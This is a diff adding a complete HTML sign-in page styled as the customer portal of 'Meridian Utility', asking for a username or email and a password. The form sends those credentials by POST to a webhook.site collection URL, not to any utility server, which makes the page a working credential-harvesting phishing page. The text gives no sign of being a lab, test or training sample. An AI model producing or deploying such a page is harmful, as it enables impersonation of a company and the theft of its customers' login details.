@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Meridian Utility — Account Sign In</title>
+<style>
+body{font-family:system-ui,Arial,sans-serif;background:#f5f7fa;display:flex;
+align-items:center;justify-content:center;height:100vh;margin:0}
+.card{background:#fff;padding:32px 36px;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,.08);width:340px}
+h1{font-size:20px;margin:0 0 6px}p.sub{color:#667;font-size:13px;margin:0 0 20px}
+label{display:block;font-size:13px;color:#334;margin:12px 0 4px}
+input{width:100%;padding:10px;border:1px solid #ccd;border-radius:6px;font-size:14px;box-sizing:border-box}
+button{width:100%;margin-top:20px;padding:11px;background:#1c6fd6;color:#fff;border:0;border-radius:6px;font-size:15px;cursor:pointer}
+.foot{margin-top:18px;font-size:12px;color:#889;text-align:center}
+</style></head><body>
+<div class="card">
+  <h1>Meridian Utility</h1>
+  <p class="sub">Sign in to view your bills and payment history.</p>
+  <form method="POST" action="https://webhook.site/bcb32102-8586-4045-83eb-1955225683f9" autocomplete="off">
+    <label for="username">Username or email</label>
+    <input id="username" name="username" type="text" required>
+    <label for="password">Password</label>
+    <input id="password" name="password" type="password" required>
+    <button type="submit">Sign in</button>
+  </form>
+  <div class="foot">Forgot password? Contact support.</div>
+</div>
+</body></html>
